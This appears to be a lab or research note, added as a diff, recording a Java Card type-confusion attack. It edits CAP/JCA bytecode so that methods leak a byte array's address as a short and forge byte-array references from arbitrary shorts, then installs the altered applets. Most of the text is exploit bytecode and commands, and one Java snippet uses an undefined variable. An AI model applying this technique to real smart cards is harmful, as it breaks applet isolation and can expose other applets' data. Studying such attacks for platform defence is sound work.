@@ -1,0 +1,97 @@
+===========================================================================================================================================
+
+AIM: 
+
+(a)  Declare a method to take a byte array as parameter and returns short type. Amend the CAP file so as make the method return the address of the byte array as short type.
+
+(b)  Declare a method to take a short as parameter and returns reference to byte array. Amend the CAP file to make the method to illegally cast the short as byte array.
+
+===========================================================================================================================================
+
+Status: Successful implementation
+
+==========================================================================================================================================
+
+METHODOLOGY
+
+(a)  Declare the following method in interface and define in ServerApplet:- 
+
+	public short getByteArrayAddress(byte[] bufferArray){
+
+        	short byteArrayAddress = (byte) 0x7777; //Any random byte
+        	bufferArray[0] = (byte)0x11; //Any random byte
+        
+        	/* Manipulate the jca/cap file to return short type of the byte array parameter */
+        	return byteArrayAddress;
+    	}
+
+(b)  The above takes a byte array as parameter and returns short value of the input parameter. Since, this will be not allowed, CAP file is manipulated.
+
+(c)  Declare another method in interface and define in ServerApplet:-
+
+	public byte[] castShortToByteArray(short addressValue) { 
+
+		short tempShort = addr;
+        	byte[] tempByte = null;
+
+        	/* Manipulate the jca/cap file to cast to byte array  */
+ 		return null; 
+    	}
+
+(d)  The above takes a short value as parameter and returns a byte array reference of the input parameter. Again the CAP file is amended to achieve this.
+
+(e)  ClientApplet gets the Shareable object from ServerApplet. If the ClientApplet invokes the getByteArrayAddress() method, it gets the byte array reference of the buffer array arguement passed. If the ClientApplet invokes the castShortToByteArray() method, it gets the value at a particular offset of the short value (address) passed as arguement.
+===========================================================================================================================================
+
+IMPLEMENTATION METHODOLOGY
+
+(a)  Generate the server.jca file by the following command. The server.jca will be in Shareable/output folder
+
+> ant server
+
+(b)  Manipulate the server.jca file. The following is the extract of the jca file pertaining to getByteArrayAddress() method. The return type of getByteArrayAddress() method is manipulated by replacing four byte code statements by nop as below:
+
+	.method public getByteArrayAddress([B)S 8 {
+			.stack 3;
+			.locals 1;
+
+				L0:	bspush 119;
+					sstore_2;
+				L1:	aload_1;
+					nop;		//sconst_0;
+					nop;		//bspush 17;
+					nop;		//bastore;
+					nop;		//sload_2;
+					sreturn;
+		}
+
+(c)  Similarly, the return type of castShortToByteArray() method is manipulated by replacing aconst_null byte code statement by sload_1 as below:
+
+	.method public castShortToByteArray(S)[B 9 {
+			.stack 1;
+			.locals 2;
+
+				L0:	sload_1;
+					sstore_2;
+				L1:	sload_1;	//aconst_null;
+					astore_3;
+				L2:	aload_3;
+					areturn;
+		}
+
+(d)  Convert the server.jca into server.cap file by the following command. Replace $JC22_HOME by the location to java_card_kit-2_2_2 location.
+
+> $JC22_HOME/bin/capgen -o server.cap server.jca
+
+(e)  Compile ClientApplet to CAP file and upload both server.cap and client.cap into Java Card
+
+>  java -jar gp.jar -install Shareable/output/server.cap -d
+
+>  ant client
+
+>  java -jar gp.jar -install Shareable/output/client.cap -d
+
+(f)  Communicate with ClientApplet using ComnCard class. 
+===========================================================================================================================================
+
+
